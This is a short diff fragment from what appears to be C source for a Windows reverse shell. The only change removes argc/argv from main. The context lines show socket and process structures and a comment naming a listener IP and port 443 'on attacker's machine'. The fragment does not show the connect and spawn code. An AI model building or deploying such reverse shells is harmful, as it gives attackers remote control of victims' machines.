@@ -11,7 +11,7 @@ struct sockaddr_in hax;
 STARTUPINFO sui;
 PROCESS_INFORMATION pi;
 
-int main(int argc, char* argv[]) {
+int main() {
     // listener ip, port on attacker's machine
     wchar_t ip[] = L"192.168.255.2";
     short port = 443;
